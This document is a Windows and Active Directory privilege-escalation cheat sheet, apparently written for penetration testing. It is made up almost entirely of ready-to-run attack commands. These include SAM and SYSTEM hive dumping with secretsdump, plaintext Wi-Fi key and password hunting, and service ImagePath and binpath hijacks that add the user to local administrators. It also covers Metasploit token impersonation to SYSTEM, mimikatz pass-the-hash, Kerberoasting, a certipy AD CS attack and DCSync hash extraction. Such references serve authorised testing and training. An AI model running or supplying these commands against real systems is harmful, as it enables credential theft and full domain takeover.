## SYSTEM ENUMERATION
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
wmic qfe
wmic logicaldisk get caption,filesystem,freespace,size,volumename

## USER ENUMERATION
whoami /priv
whoami /groups
net user
net user <username>
net localgroup

## NETWORK ENUMERATION
ipconfig /all
arp -a
route print
netstat -ano

## HUNTING PASSWORDS
findstr /si password *.txt
netsh wlan show profile [SSID] key=clear

## FIREWALL / ANTIVIRUS
sc query windefend
sc queryex type=service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config

## WINDOWS SUBSYSTEM FOR LINUX
where /R C:\windows bash.exe
where /R C:\windows wsl.exe

## POTATO ATTACK
multi/script/web_delivery
run post/multi/recon/local_exploit_suggester
use exploit/windows/local/ms16_075_reflection
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
shell
getsystem

## RUNAS
cmdkey /list
C:\Windows\System32\runas.exe /user:[domain/user] /savecred "C:\Windows\System32\cmd.exe /c [command] > [output]"

## REGSVC ACL
reg save HKLM\SAM SAM --> download sam
reg save HKLM\SYSTEM SYSTEM  --> download system

	- secretsdump.py local -sam sam -system system

Get-Acl -Path hklm:\System\CurrentControlSet\services\ | format-list
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\x.exe /f
sc start regsvc

## STARTUP APPS
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

## DLL HIJACKING
sc stop <service> & sc start <service>
ProcMon filter: "NAME NOT FOUND" and ends with ".dll"

## BINARY PATHS
accesschk64.exe -uwcv Everyone *
sc qc <service>
sc config <service> binpath= "net localgroup administrators [user] /add"
sc stop <service> & sc start <service>

## UNQUOTED SERVICE PATHS
## (Run PowerUp.ps1 and replace files in the unquoted directory path)

## CVE-2019-1388
## Follow the manual GUI steps for privilege escalation.

## POWERSHELL SCRIPTS
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
.\PowerUp.ps1
Invoke-AllChecks

## AD ENUMERATION (NO CREDENTIALS)
net user /DOMAIN
net group /DOMAIN
net share
net localgroup

## AD ENUMERATION (WITH CREDENTIALS)
GetNPUsers.py domain/user -dc-ip <IP> -no-pass
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"

## KERBEROASTING
GetSPN.ps1
Invoke-Kerberoast.ps1

## OVERPASS THE HASH
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:PowerShell.exe

## PSExec
psexec.py <domain>/<user>:<pass>@<IP>

## AD CS ATTACK
certipy find -dc-ip <IP> -u <user> -p <pass>
certipy req -ca <CA_NAME> -target <DC> -u <user> -p <pass>
certipy auth -pfx <admin.pfx> -dc-ip <IP>
evil-winrm -i <target> -u administrator -H <HASH>

## DCSYNC ATTACK
secretsdump.py <domain>/<user>@<IP> -hashes <HASH>
rpcclient -U "" <IP>